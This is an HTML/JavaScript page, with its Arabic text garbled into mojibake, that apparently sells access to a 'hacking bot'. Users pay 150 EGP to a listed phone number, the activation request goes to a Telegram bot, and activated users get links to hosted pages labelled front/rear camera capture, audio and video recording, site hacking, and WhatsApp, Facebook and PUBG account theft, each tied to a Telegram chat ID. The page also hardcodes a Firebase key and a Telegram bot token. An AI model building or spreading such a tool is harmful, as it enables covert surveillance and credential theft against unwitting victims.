<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>X-TERMINAL SYSTEM</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; margin: 0; padding: 20px; }
        .container { max-width: 500px; margin: auto; border: 1px solid #00ff00; padding: 20px; box-shadow: 0 0 20px #00ff00; border-radius: 10px; }
        input { background: #000; border: 1px solid #00ff00; color: #fff; padding: 12px; width: 90%; margin: 10px 0; outline: none; }
        .btn { background: #00ff00; color: #000; font-weight: bold; padding: 15px; width: 100%; border: none; cursor: pointer; transition: 0.3s; }
        .btn:hover { background: #00cc00; transform: scale(1.02); }
        .services-grid { display: none; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 20px; }
        .service-btn { background: rgba(0, 255, 0, 0.1); border: 1px solid #00ff00; color: #fff; padding: 15px; text-align: center; text-decoration: none; border-radius: 8px; font-size: 13px; transition: 0.3s; }
        .service-btn:hover { background: rgba(0, 255, 0, 0.3); }
        #media-box { display: none; margin-top: 20px; border-top: 1px solid #333; padding-top: 15px; }
        #media-list img, #media-list video { width: 100%; border-radius: 10px; margin-bottom: 10px; border: 1px solid #444; }
    </style>
</head>
<body>

<div class="container">
    <h1 style="text-align:center; color:red; text-shadow: 0 0 10px red;">â˜¢ï¸ CORE SYSTEM â˜¢ï¸</h1>

    <div id="auth-section">
        <p>> ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„Ø¬ÙŠÙ…ÙŠÙ„:</p>
        <input type="email" id="email" placeholder="example@gmail.com">
        <button class="btn" onclick="register()">Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ ID ÙˆØªÙØ¹ÙŠÙ„</button>
    </div>

    <div id="wait-section" style="display:none;">
        <p>Ù…Ø±Ø­Ø¨Ø§Ù‹: <span id="u-email" style="color:cyan;"></span></p>
        <p style="background: #222; padding: 10px; border: 1px dashed yellow;">ID Ø§Ù„Ø®Ø§Øµ Ø¨Ùƒ: <b id="u-id" style="color:yellow;"></b></p>
        <p>Ù„ØªÙØ¹ÙŠÙ„ Ø§Ù„Ø¨ÙˆØªØŒ Ø­ÙˆÙ„ 150Ø¬ Ù„Ù€: <br> <b style="font-size: 20px;">01210931358</b></p>
        <input type="text" id="p-phone" placeholder="Ø±Ù‚Ù… Ø§Ù„Ù…Ø­ÙØ¸Ø© Ø§Ù„Ù…Ø­ÙˆÙ„ Ù…Ù†Ù‡Ø§">
        <button class="btn" onclick="requestActive()">ØªÙ… Ø§Ù„ØªØ­ÙˆÙŠÙ„ - Ø·Ù„Ø¨ ØªÙØ¹ÙŠÙ„</button>
    </div>

    <div id="active-section" style="display:none;">
        <h3 style="color:yellow; text-align:center;">âœ… ØªÙ… ØªÙØ¹ÙŠÙ„ Ø§Ù„Ø¹Ø¶ÙˆÙŠØ© Ø¨Ù†Ø¬Ø§Ø­</h3>
        <div class="services-grid" id="grid">
            <a href="https://tmpweb.net/Jqd9NNxGbdT6/?chatId=7549050561" class="service-btn">ğŸ“¸ ÙƒØ§Ù…ÙŠØ±Ø§ Ø£Ù…Ø§Ù…ÙŠØ©</a>
            <a href="https://tmpweb.net/Yb0uksirR2Fk/?chatId=7549050561" class="service-btn">ğŸ“· ÙƒØ§Ù…ÙŠØ±Ø§ Ø®Ù„ÙÙŠØ©</a>
            <a href="https://tmpweb.net/TEQXejpQWrhp/?chatId=7549050561" class="service-btn">ğŸŒ Ø§Ø®ØªØ±Ø§Ù‚ Ù…ÙˆÙ‚Ø¹</a>
            <a href="https://tmpweb.net/R_jX4nttzKSk/?chatId=7549050561" class="service-btn">ğŸ¤ ØªØ³Ø¬ÙŠÙ„ ØµÙˆØª</a>
            <a href="https://tmpweb.net/UhJ_utmCh2ab/?chatId=7549050561" class="service-btn">ğŸ“¹ ØªØµÙˆÙŠØ± ÙÙŠØ¯ÙŠÙˆ</a>
            <a href="https://tmpweb.net/ypbWSSbpyJTB/?chatId=7549050561" class="service-btn">ğŸ’¬ ÙˆØ§ØªØ³Ø§Ø¨</a>
            <a href="https://tmpweb.net/TOx1JCBv308C/?chatId=7549050561" class="service-btn">ğŸ‘¤ ÙÙŠØ³Ø¨ÙˆÙƒ</a>
            <a href="https://tmpweb.net/6KVSHiiWtMrY/?chatId=7549050561" class="service-btn">ğŸ® Ø¨Ø¨Ø¬ÙŠ</a>
        </div>
        <div id="media-box">
            <h4 style="color:cyan;">ğŸ“¥ Ù…Ù„ÙØ§Øª Ù…Ø³ØªÙ„Ù…Ø© Ù…Ù† Ø§Ù„Ø¥Ø¯Ø§Ø±Ø©:</h4>
            <div id="media-list"></div>
        </div>
    </div>
</div>

<script>
    // Ø¨ÙŠØ§Ù†Ø§Øª Firebase Ø§Ù„Ø®Ø§ØµØ© Ø¨Ùƒ
    const firebaseConfig = {
        apiKey: "AIzaSyDI1E22w698Gl8pKQP0tomfzWjsSP03wdk",
        databaseURL: "https://testing-a8c1c-default-rtdb.firebaseio.com",
        projectId: "testing-a8c1c",
        storageBucket: "testing-a8c1c.appspot.com"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    function register() {
        const mail = document.getElementById('email').value;
        if(!mail.includes('@')) return alert("Ø£Ø¯Ø®Ù„ Ø¬ÙŠÙ…ÙŠÙ„ ØµØ­ÙŠØ­");
        const id = "ID-" + Math.floor(Math.random()*99999);
        localStorage.setItem('myID', id);
        
        db.ref('users/' + id).set({ email: mail, status: 'pending' });
        listenStatus(id);
    }

    function listenStatus(id) {
        db.ref('users/' + id).on('value', (snapshot) => {
            const data = snapshot.val();
            if(!data) return;
            
            document.getElementById('auth-section').style.display = 'none';
            if(data.status === 'active') {
                document.getElementById('wait-section').style.display = 'none';
                document.getElementById('active-section').style.display = 'block';
                document.getElementById('grid').style.display = 'grid';
                loadMedia(id);
            } else {
                document.getElementById('wait-section').style.display = 'block';
                document.getElementById('u-email').innerText = data.email;
                document.getElementById('u-id').innerText = id;
            }
        });
    }

    function loadMedia(id) {
        db.ref('media/' + id).on('value', (snapshot) => {
            const list = document.getElementById('media-list');
            list.innerHTML = "";
            if (snapshot.exists()) {
                document.getElementById('media-box').style.display = 'block';
                snapshot.forEach(child => {
                    const item = child.val();
                    if(item.type === 'image') {
                        list.innerHTML += `<img src="${item.url}">`;
                    } else {
                        list.innerHTML += `<video src="${item.url}" controls></video>`;
                    }
                });
            }
        });
    }

    function requestActive() {
        const phone = document.getElementById('p-phone').value;
        const id = localStorage.getItem('myID');
        const mail = localStorage.getItem('userEmail');
        fetch(`https://api.telegram.org/bot8308420533:AAEC3g7VXj6eiPF1GyDqSdvJfHzFOClkZfo/sendMessage?chat_id=7549050561&text=${encodeURIComponent("ğŸ’° Ø·Ù„Ø¨ ØªÙØ¹ÙŠÙ„!\nID: " + id + "\nØ±Ù‚Ù… Ø§Ù„Ø¹Ù…ÙŠÙ„: " + phone)}`);
        alert("ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø·Ù„Ø¨Ùƒ Ø¨Ù†Ø¬Ø§Ø­! Ø³ÙŠØªÙ… Ø§Ù„ØªÙØ¹ÙŠÙ„ Ø¨Ù…Ø¬Ø±Ø¯ Ù…Ø±Ø§Ø¬Ø¹Ø© Ø§Ù„ØªØ­ÙˆÙŠÙ„.");
    }

    const myID = localStorage.getItem('myID');
    if(myID) listenStatus(myID);
</script>
</body>
</html>
